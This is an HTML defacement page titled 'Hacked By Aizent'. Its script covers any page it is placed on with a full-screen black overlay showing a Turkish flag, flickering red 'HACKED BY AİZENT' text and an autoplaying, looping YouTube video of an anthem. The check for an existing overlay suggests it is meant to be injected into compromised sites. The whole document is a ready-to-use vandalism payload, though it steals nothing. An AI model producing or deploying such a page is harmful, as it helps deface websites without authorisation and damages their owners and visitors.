<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Hacked By Aizent</title>
  <style>
    @keyframes flicker {
      0% {
        opacity: 1;
        text-shadow: 0 0 10px red;
      }
      100% {
        opacity: 0.6;
        text-shadow: 0 0 20px red;
      }
    }
    #aizent-overlay {
      position: fixed;
      top: 0; left: 0; right: 0; bottom: 0;
      background-color: rgba(0, 0, 0, 0.95);
      z-index: 999999;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      color: red;
      user-select: none;
    }
    #aizent-overlay h1 {
      font-family: monospace;
      font-size: 60px;
      animation: flicker 2s infinite alternate;
      margin: 0 0 30px 0;
    }
    #aizent-overlay img {
      width: 150px;
      filter: drop-shadow(0 0 5px red);
      margin-bottom: 30px;
    }
    #aizent-overlay iframe {
      width: 640px;
      height: 360px;
      border: none;
      filter: drop-shadow(0 0 10px red);
      border-radius: 15px;
    }
    @media (max-width: 700px) {
      #aizent-overlay iframe {
        width: 90vw;
        height: calc(90vw * 9 / 16);
      }
    }
  </style>
</head>
<body>
  <script>
    if (!document.getElementById('aizent-overlay')) {
      // Overlay container
      const overlay = document.createElement('div');
      overlay.id = 'aizent-overlay';

      // Flag image
      const flag = document.createElement('img');
      flag.src = 'https://upload.wikimedia.org/wikipedia/commons/b/b4/Flag_of_Turkey.svg';
      flag.alt = 'Türk Bayrağı';

      // Hacked text
      const h1 = document.createElement('h1');
      h1.innerText = 'HACKED BY AİZENT';

      // YouTube video iframe (İstiklal Marşı)
      const iframe = document.createElement('iframe');
      iframe.src = 'https://www.youtube.com/embed/Y75Km7dlt94?autoplay=1&mute=0&loop=1&playlist=Y75Km7dlt94';
      iframe.allow = 'autoplay; encrypted-media';
      iframe.allowFullscreen = true;

      // Append all
      overlay.appendChild(flag);
      overlay.appendChild(h1);
      overlay.appendChild(iframe);
      document.body.appendChild(overlay);
    }
  </script>
</body>
